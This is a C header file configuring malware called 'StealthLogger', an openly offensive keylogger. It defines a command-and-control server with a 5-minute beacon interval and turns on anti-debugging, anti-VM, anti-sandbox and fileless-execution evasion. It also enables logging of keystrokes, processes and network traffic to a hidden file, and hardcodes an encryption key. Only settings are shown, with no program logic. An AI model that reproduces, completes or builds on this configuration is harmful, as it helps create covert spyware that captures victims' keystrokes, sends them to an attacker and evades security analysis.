#ifndef PAYLOAD_CONFIG_H
#define PAYLOAD_CONFIG_H

// Stealth Payload Configuration
#define PAYLOAD_NAME "StealthLogger v1.0"
#define PAYLOAD_VERSION "1.0.0"
#define PAYLOAD_AUTHOR "FaZe0wNsJeW"

// C2 Configuration
#define C2_SERVER "c2.example.com"
#define C2_PORT 443
#define C2_PROTOCOL "HTTPS"
#define C2_INTERVAL 300 // 5 minutes in seconds

// Evasion Configuration
#define ANTI_DEBUG 1
#define ANTI_VM 1
#define ANTI_SANDBOX 1
#define FILELESS_EXECUTION 1

// Logging Configuration
#define LOG_KEYSTROKES 1
#define LOG_SCREENSHOTS 0
#define LOG_PROCESSES 1
#define LOG_NETWORK 1
#define LOG_FILE "~/.stealth.log"

// Encryption Configuration
#define ENCRYPTION_KEY "5uP3rS3cr3tK3y"
#define ENCRYPTION_ALGORITHM "AES-256-CBC"

#endif // PAYLOAD_CONFIG_H